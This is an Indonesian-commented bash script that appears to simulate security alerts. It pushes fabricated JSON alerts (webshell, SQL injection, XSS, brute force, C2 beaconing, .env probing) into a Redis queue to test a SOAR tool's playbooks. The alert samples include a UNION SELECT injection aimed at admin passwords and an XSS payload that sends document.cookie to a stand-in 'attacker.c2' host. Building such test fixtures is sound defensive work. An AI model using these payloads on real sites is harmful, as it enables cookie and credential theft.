#!/usr/bin/env bash
# ==============================================================================
# MiniSOAR Alert Simulator (Redis Injector)
# ==============================================================================
# Script simulasi untuk menginjeksi log alert keamanan tiruan ke dalam antrean
# Redis (logstash_alert_queue) untuk menguji penanganan alert daemon, playbook,
# mitigasi perimeter, dan sinkronisasi EDR IoC.
# ==============================================================================

set -e

# Warna Terminal
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

# Resolusi Direktori Root MiniSOAR
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

# Muat variabel dari .env jika ada
if [ -f ".env" ]; then
    export $(grep -v '^#' .env | xargs -d '\n' 2>/dev/null || true)
fi

REDIS_HOST="${REDIS_HOST:-127.0.0.1}"
REDIS_PORT="${REDIS_PORT:-6379}"
REDIS_KEY="${REDIS_KEY:-${REDIS_CHANNEL:-logstash_alert_queue}}"
REDIS_PASSWORD="${REDIS_PASSWORD:-}"

PYTHON_BIN="python3"
if [ -f ".venv/bin/python" ]; then
    PYTHON_BIN=".venv/bin/python"
elif [ -f ".venv/Scripts/python.exe" ]; then
    PYTHON_BIN=".venv/Scripts/python.exe"
fi

print_header() {
    echo -e "${BOLD}${CYAN}"
    echo "======================================================================"
    echo "       🚀 MiniSOAR Alert & Log Simulator (Redis Ingestion Test)       "
    echo "======================================================================"
    echo -e "${NC}"
    echo -e "• Target Redis : ${BOLD}${YELLOW}${REDIS_HOST}:${REDIS_PORT}${NC}"
    echo -e "• Target Queue : ${BOLD}${GREEN}${REDIS_KEY}${NC}"
    echo ""
}

# Fungsi cek koneksi Redis & ambil panjang queue (LLEN)
get_queue_length() {
    if command -v redis-cli &>/dev/null; then
        if [ -n "$REDIS_PASSWORD" ]; then
            redis-cli -h "$REDIS_HOST" -p "$REDIS_PORT" -a "$REDIS_PASSWORD" llen "$REDIS_KEY" 2>/dev/null || echo "-1"
        else
            redis-cli -h "$REDIS_HOST" -p "$REDIS_PORT" llen "$REDIS_KEY" 2>/dev/null || echo "-1"
        fi
    else
        "$PYTHON_BIN" -c "
import os, redis
try:
    r = redis.Redis(host='${REDIS_HOST}', port=int('${REDIS_PORT}'), password='${REDIS_PASSWORD}' or None, socket_timeout=3)
    print(r.llen('${REDIS_KEY}'))
except Exception:
    print('-1')
" 2>/dev/null || echo "-1"
    fi
}

# Fungsi untuk mengirimkan JSON string ke Redis queue via LPUSH
push_to_redis() {
    local payload="$1"
    local alert_title="$2"

    local q_before=$(get_queue_length)
    if [ "$q_before" = "-1" ]; then
        echo -e "${RED}[ERROR] Gagal terhubung ke Redis di ${REDIS_HOST}:${REDIS_PORT}.${NC}"
        echo -e "${YELLOW}[HINT] Pastikan redis-server aktif. Jalankan: sudo systemctl start redis-server${NC}"
        exit 1
    fi

    echo -e "${CYAN}[SENDING]${NC} Mengirim payload alert '${BOLD}${alert_title}${NC}' ke antrean '${BOLD}${REDIS_KEY}${NC}'..."

    local push_status=0
    if command -v redis-cli &>/dev/null; then
        if [ -n "$REDIS_PASSWORD" ]; then
            redis-cli -h "$REDIS_HOST" -p "$REDIS_PORT" -a "$REDIS_PASSWORD" lpush "$REDIS_KEY" "$payload" >/dev/null || push_status=1
        else
            redis-cli -h "$REDIS_HOST" -p "$REDIS_PORT" lpush "$REDIS_KEY" "$payload" >/dev/null || push_status=1
        fi
    else
        export SIM_PAYLOAD="$payload"
        export SIM_R_HOST="$REDIS_HOST"
        export SIM_R_PORT="$REDIS_PORT"
        export SIM_R_PASS="$REDIS_PASSWORD"
        export SIM_R_KEY="$REDIS_KEY"

        "$PYTHON_BIN" -c "
import os, redis, sys
try:
    host = os.environ['SIM_R_HOST']
    port = int(os.environ['SIM_R_PORT'])
    password = os.environ['SIM_R_PASS'] or None
    key = os.environ['SIM_R_KEY']
    payload = os.environ['SIM_PAYLOAD']
    r = redis.Redis(host=host, port=port, password=password, socket_timeout=5)
    r.lpush(key, payload)
except Exception as e:
    sys.exit(1)
" || push_status=1
    fi

    if [ "$push_status" -eq 0 ]; then
        local q_after=$(get_queue_length)
        echo -e "${GREEN}[SUCCESS]${NC} Alert berhasil di-inject ke Redis! ${BOLD}(Queue Length: ${q_before} -> ${q_after})${NC}\n"
    else
        echo -e "${RED}[FAIL]${NC} Gagal memasukkan payload ke Redis.\n"
        exit 1
    fi
}

# Template Generator untuk Payload Alert
generate_payload() {
    local scenario="$1"
    local custom_ip="${2:-}"
    local custom_domain="${3:-}"

    local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%S.000Z")

    case "$scenario" in
        webshell)
            local target_ip="${custom_ip:-185.220.101.5}"
            local target_domain="${custom_domain:-layanan.komdigi.go.id}"
            cat <<EOF
{
  "@timestamp": "$timestamp",
  "src_ip": "$target_ip",
  "server_name": "$target_domain",
  "url_original": "/wp-content/uploads/alfa.php",
  "http_status": 200,
  "http_method": "POST",
  "tags": ["alert_webshell_immediate", "webshell_access", "critical"],
  "alert": {
    "type": "alert_webshell_immediate",
    "title_plain": "WebShell Immediate",
    "title": "WebShell Immediate 🧨",
    "emoji": "🧨",
    "severity": "critical",
    "severity_hint": "critical",
    "src_ip": "$target_ip",
    "server_name": "$target_domain",
    "url": "/wp-content/uploads/alfa.php",
    "status": 200,
    "method": "POST",
    "tags": ["alert_webshell_immediate", "webshell_access", "critical"],
    "count": 1,
    "ts": "$timestamp",
    "samples": ["POST;/wp-content/uploads/alfa.php;200"]
  }
}
EOF
            ;;

        sqli)
            local target_ip="${custom_ip:-45.155.205.233}"
            local target_domain="${custom_domain:-portal.komdigi.go.id}"
            cat <<EOF
{
  "@timestamp": "$timestamp",
  "src_ip": "$target_ip",
  "server_name": "$target_domain",
  "url_original": "/api/v1/users?id=1%20UNION%20SELECT%20username,password%20FROM%20admin_users--",
  "http_status": 500,
  "http_method": "GET",
  "tags": ["alert_sqli_attack", "sqli", "injection", "high"],
  "alert": {
    "type": "alert_sqli_attack",
    "title_plain": "SQL Injection Attack",
    "title": "SQL Injection Attack 💉",
    "emoji": "💉",
    "severity": "high",
    "severity_hint": "high",
    "src_ip": "$target_ip",
    "server_name": "$target_domain",
    "url": "/api/v1/users?id=1%20UNION%20SELECT%20username,password%20FROM%20admin_users--",
    "status": 500,
    "method": "GET",
    "tags": ["alert_sqli_attack", "sqli", "injection", "high"],
    "count": 3,
    "ts": "$timestamp",
    "samples": ["GET;/api/v1/users?id=1%20UNION%20SELECT...;500"]
  }
}
EOF
            ;;

        xss)
            local target_ip="${custom_ip:-194.26.29.112}"
            local target_domain="${custom_domain:-layanan.komdigi.go.id}"
            cat <<EOF
{
  "@timestamp": "$timestamp",
  "src_ip": "$target_ip",
  "server_name": "$target_domain",
  "url_original": "/comments?msg=%3Cscript%3Efetch('http://attacker.c2/steal?c='%2Bdocument.cookie)%3C/script%3E",
  "http_status": 200,
  "http_method": "POST",
  "tags": ["alert_xss_attack", "xss", "high"],
  "alert": {
    "type": "alert_xss_attack",
    "title_plain": "Cross-Site Scripting (XSS)",
    "title": "Cross-Site Scripting ⚡",
    "emoji": "⚡",
    "severity": "high",
    "severity_hint": "high",
    "src_ip": "$target_ip",
    "server_name": "$target_domain",
    "url": "/comments?msg=<script>...",
    "status": 200,
    "method": "POST",
    "tags": ["alert_xss_attack", "xss", "high"],
    "count": 2,
    "ts": "$timestamp",
    "samples": ["POST;/comments?msg=<script>...;200"]
  }
}
EOF
            ;;

        bruteforce)
            local target_ip="${custom_ip:-103.145.13.88}"
            local target_domain="${custom_domain:-auth.komdigi.go.id}"
            cat <<EOF
{
  "@timestamp": "$timestamp",
  "src_ip": "$target_ip",
  "server_name": "$target_domain",
  "url_original": "/admin/login.php",
  "http_status": 401,
  "http_method": "POST",
  "tags": ["alert_url_major", "auth_bruteforce", "error_burst", "high"],
  "alert": {
    "type": "alert_url_major",
    "title_plain": "Authentication Brute Force Burst",
    "title": "URL Error Burst (Major) 🚨",
    "emoji": "🚨",
    "severity": "high",
    "severity_hint": "high",
    "src_ip": "$target_ip",
    "server_name": "$target_domain",
    "url": "/admin/login.php",
    "status": 401,
    "method": "POST",
    "tags": ["alert_url_major", "auth_bruteforce", "error_burst", "high"],
    "count": 55,
    "ts": "$timestamp",
    "samples": ["POST;/admin/login.php;401", "POST;/admin/login.php;401"]
  }
}
EOF
            ;;

        c2)
            local target_ip="${custom_ip:-91.240.118.172}"
            local target_domain="${custom_domain:-srv-backend-01.komdigi.go.id}"
            cat <<EOF
{
  "@timestamp": "$timestamp",
  "src_ip": "$target_ip",
  "server_name": "$target_domain",
  "url_original": "/api/v1/telemetry_sync",
  "http_status": 200,
  "http_method": "POST",
  "tags": ["alert_c2_communication", "ransomware_indicator", "critical"],
  "alert": {
    "type": "alert_c2_communication",
    "title_plain": "C2 Communication & Beaconing",
    "title": "C2 Communication ☠️",
    "emoji": "☠️",
    "severity": "critical",
    "severity_hint": "critical",
    "src_ip": "$target_ip",
    "server_name": "$target_domain",
    "url": "/api/v1/telemetry_sync",
    "status": 200,
    "method": "POST",
    "tags": ["alert_c2_communication", "ransomware_indicator", "critical"],
    "count": 1,
    "ts": "$timestamp",
    "samples": ["POST;/api/v1/telemetry_sync;200"]
  }
}
EOF
            ;;

        probe)
            local target_ip="${custom_ip:-178.62.204.14}"
            local target_domain="${custom_domain:-layanan.komdigi.go.id}"
            cat <<EOF
{
  "@timestamp": "$timestamp",
  "src_ip": "$target_ip",
  "server_name": "$target_domain",
  "url_original": "/.env",
  "http_status": 404,
  "http_method": "GET",
  "tags": ["alert_url_probe", "scanner", "medium"],
  "alert": {
    "type": "alert_url_probe",
    "title_plain": "Exploit/Probe URL",
    "title": "Exploit/Probe URL 🛠️",
    "emoji": "🛠️",
    "severity": "medium",
    "severity_hint": "medium",
    "src_ip": "$target_ip",
    "server_name": "$target_domain",
    "url": "/.env",
    "status": 404,
    "method": "GET",
    "tags": ["alert_url_probe", "scanner", "medium"],
    "count": 12,
    "ts": "$timestamp",
    "samples": ["GET;/.env;404", "GET;/config.json;404"]
  }
}
EOF
            ;;

        *)
            echo ""
            ;;
    esac
}

run_scenario() {
    local sc_name="$1"
    local sc_title="$2"
    local custom_ip="${3:-}"
    local custom_domain="${4:-}"

    echo -e "${BOLD}${BLUE}=== [SKENARIO: ${sc_title}] ===${NC}"
    local payload=$(generate_payload "$sc_name" "$custom_ip" "$custom_domain")
    
    echo -e "${YELLOW}Payload Preview:${NC}"
    echo "$payload" | python3 -m json.tool 2>/dev/null || echo "$payload"
    echo ""

    push_to_redis "$payload" "$sc_title"
}

# Mode CLI interaktif (Menu)
interactive_menu() {
    print_header
    echo -e "${BOLD}Pilih Skenario Serangan / Alert untuk Diuji:${NC}"
    echo -e "  ${BOLD}1)${NC} ${RED}WebShell Immediate (POST 200/Critical)${NC}      -> Trigger Playbook: ${CYAN}pb-webshell-immediate${NC}"
    echo -e "  ${BOLD}2)${NC} ${MAGENTA}SQL Injection Attack (UNION SELECT/High)${NC}   -> Trigger Playbook: ${CYAN}pb-web-injection${NC}"
    echo -e "  ${BOLD}3)${NC} ${YELLOW}Cross-Site Scripting (XSS Attack/High)${NC}     -> Trigger Playbook: ${CYAN}pb-web-injection${NC}"
    echo -e "  ${BOLD}4)${NC} ${YELLOW}Brute Force / Major Error Burst (401/High)${NC}  -> Trigger Playbook: ${CYAN}pb-bruteforce-probing${NC}"
    echo -e "  ${BOLD}5)${NC} ${RED}C2 Communication / Ransomware IoC (Critical)${NC}-> Trigger Playbook: ${CYAN}pb-edr-host-compromise${NC}"
    echo -e "  ${BOLD}6)${NC} ${BLUE}Sensitive URL Probe (/.env / Medium)${NC}        -> Trigger Playbook: ${CYAN}pb-bruteforce-probing${NC}"
    echo -e "  ${BOLD}7)${NC} ${GREEN}Custom Input (Tentukan IP, Domain & Attack Type)${NC}"
    echo -e "  ${BOLD}8)${NC} ${CYAN}Simulasi Burst (Kirim 5 Serangan Sekaligus)${NC}"
    echo -e "  ${BOLD}9)${NC} ${MAGENTA}SecureSphere WAF Attack Replay & ML Validation (Elasticsearch)${NC}"
    echo -e "  ${BOLD}0)${NC} Keluar"
    echo ""
    read -p "Masukkan pilihan [0-9]: " choice

    case "$choice" in
        1)
            run_scenario "webshell" "WebShell Immediate Upload (Critical)"
            ;;
        2)
            run_scenario "sqli" "SQL Injection Attack (High)"
            ;;
        3)
            run_scenario "xss" "Cross-Site Scripting (High)"
            ;;
        4)
            run_scenario "bruteforce" "Brute Force Authentication Burst (High)"
            ;;
        5)
            run_scenario "c2" "C2 Communication & Threat Intel IoC (Critical)"
            ;;
        6)
            run_scenario "probe" "Sensitive File & Path Probe (Medium)"
            ;;
        7)
            echo ""
            read -p "Masukkan Target IP Penyerang [misal: 198.51.100.99]: " usr_ip
            read -p "Masukkan Domain Website [misal: layanan.komdigi.go.id]: " usr_domain
            echo "Pilih tipe payload: [1] Webshell, [2] SQLi, [3] XSS, [4] BruteForce, [5] C2, [6] Probe"
            read -p "Tipe [1-6]: " usr_type_idx
            case "$usr_type_idx" in
                1) run_scenario "webshell" "Custom WebShell" "$usr_ip" "$usr_domain" ;;
                2) run_scenario "sqli" "Custom SQL Injection" "$usr_ip" "$usr_domain" ;;
                3) run_scenario "xss" "Custom XSS" "$usr_ip" "$usr_domain" ;;
                4) run_scenario "bruteforce" "Custom Brute Force" "$usr_ip" "$usr_domain" ;;
                5) run_scenario "c2" "Custom C2 IoC" "$usr_ip" "$usr_domain" ;;
                *) run_scenario "probe" "Custom Probe" "$usr_ip" "$usr_domain" ;;
            esac
            ;;
        8)
            echo -e "\n${BOLD}${CYAN}=== Menjalankan Simulasi Serangan Burst (5 Skenario) ===${NC}\n"
            run_scenario "webshell" "1/5: WebShell Immediate"
            sleep 1
            run_scenario "sqli" "2/5: SQL Injection"
            sleep 1
            run_scenario "xss" "3/5: XSS Attack"
            sleep 1
            run_scenario "c2" "4/5: C2 Communication"
            sleep 1
            run_scenario "bruteforce" "5/5: Brute Force Burst"
            ;;
        9|securesphere)
            echo -e "\n${BOLD}${CYAN}=== Replay Serangan Riil SecureSphere & Validasi Model ML ===${NC}\n"
            read -p "Jumlah sampel serangan yang akan diambil dari Elasticsearch [default: 500]: " spl_size
            spl_size="${spl_size:-500}"
            read -p "Apakah ingin menginjeksi sample serangan ke antrean Redis juga? (y/N): " inj_opt
            if [[ "$inj_opt" =~ ^[Yy]$ ]]; then
                "$PYTHON_BIN" -m minisoar.ml.replay --samples "$spl_size" --inject-redis
            else
                "$PYTHON_BIN" -m minisoar.ml.replay --samples "$spl_size"
            fi
            ;;
        0|q|exit)
            echo "Keluar."
            exit 0
            ;;
        *)
            echo -e "${RED}Pilihan tidak valid.${NC}"
            exit 1
            ;;
    esac

    echo "----------------------------------------------------------------------"
    echo -e "💡 ${BOLD}Tips Pemantauan:${NC}"
    echo -e "• Untuk melihat eksekusi Alert Daemon:   ${GREEN}tail -f logs/daemon.log${NC}"
    echo -e "• Untuk melihat log mitigasi / audit:     ${GREEN}tail -f tele-soar-actions.log${NC}"
    echo -e "• Untuk memantau notifikasi Telegram:     Periksa grup/chat Telegram bot Anda"
    echo ""
    read -p "Apakah Anda ingin langsung melihat live log daemon sekarang? (y/N): " see_logs
    if [[ "$see_logs" =~ ^[Yy]$ ]]; then
        echo -e "${CYAN}Menampilkan 25 baris terakhir logs/daemon.log... (Tekan Ctrl+C untuk keluar)${NC}\n"
        tail -n 25 -f logs/daemon.log
    fi
}

# --- Main Entrypoint ---
if [ $# -eq 0 ]; then
    interactive_menu
else
    print_header
    cmd_sc="$1"
    custom_ip="${2:-}"
    custom_domain="${3:-}"

    case "$cmd_sc" in
        webshell|shell)
            run_scenario "webshell" "WebShell Immediate Upload (Critical)" "$custom_ip" "$custom_domain"
            ;;
        sqli|sql)
            run_scenario "sqli" "SQL Injection Attack (High)" "$custom_ip" "$custom_domain"
            ;;
        xss)
            run_scenario "xss" "Cross-Site Scripting (High)" "$custom_ip" "$custom_domain"
            ;;
        bruteforce|burst)
            run_scenario "bruteforce" "Brute Force Authentication Burst (High)" "$custom_ip" "$custom_domain"
            ;;
        c2|ransomware)
            run_scenario "c2" "C2 Communication & Threat Intel IoC (Critical)" "$custom_ip" "$custom_domain"
            ;;
        probe|scan)
            run_scenario "probe" "Sensitive File & Path Probe (Medium)" "$custom_ip" "$custom_domain"
            ;;
        all|multi)
            echo -e "\n${BOLD}${CYAN}=== Menjalankan Simulasi Serangan Burst (5 Skenario) ===${NC}\n"
            run_scenario "webshell" "1/5: WebShell Immediate"
            sleep 1
            run_scenario "sqli" "2/5: SQL Injection"
            sleep 1
            run_scenario "c2" "3/5: C2 Communication"
            ;;
        securesphere|securesphere-replay|replay)
            shift || true
            "$PYTHON_BIN" -m minisoar.ml.replay "$@"
            ;;
        help|--help|-h)
            echo "Penggunaan: ./simulate_alert.sh [skenario] [ip] [domain]"
            echo ""
            echo "Pilihan Skenario:"
            echo "  webshell      : Simulasi Webshell Immediate 200 OK (Critical)"
            echo "  sqli          : Simulasi SQL Injection Attack 500 (High)"
            echo "  xss           : Simulasi Stored/Reflected XSS 200 (High)"
            echo "  bruteforce    : Simulasi Brute Force 401 Error Burst (High)"
            echo "  c2            : Simulasi C2 Communication & EDR IoC Push (Critical)"
            echo "  probe         : Simulasi Exploit Scanner /.env (Medium)"
            echo "  all           : Simulasi pengiriman beberapa jenis serangan sekaligus"
            echo "  securesphere  : Replay trafik serangan riil SecureSphere & validasi Model ML"
            echo ""
            echo "Contoh:"
            echo "  ./simulate_alert.sh webshell"
            echo "  ./simulate_alert.sh securesphere --samples 500"
            ;;
        *)
            echo -e "${RED}[ERROR] Skenario '$cmd_sc' tidak dikenali.${NC}"
            echo "Gunakan './simulate_alert.sh --help' untuk melihat daftar skenario."
            exit 1
            ;;
    esac
fi
